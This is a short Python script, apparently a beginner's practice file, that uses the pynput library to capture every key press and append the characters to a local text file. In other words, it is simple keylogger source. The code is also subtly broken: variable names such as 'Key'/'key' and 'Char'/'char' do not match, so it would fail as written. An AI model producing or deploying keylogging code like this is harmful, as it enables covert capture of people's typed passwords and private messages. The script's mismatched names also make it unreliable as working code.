from pynput import keyboard

def KeyPressed (Key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try: 
            Char = key.char
            logKey.write(char)
        except:
            print("Error getting chat")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=KeyPressed)
    listener.start()
    input()
#adding some code in here to see if the git commit works    

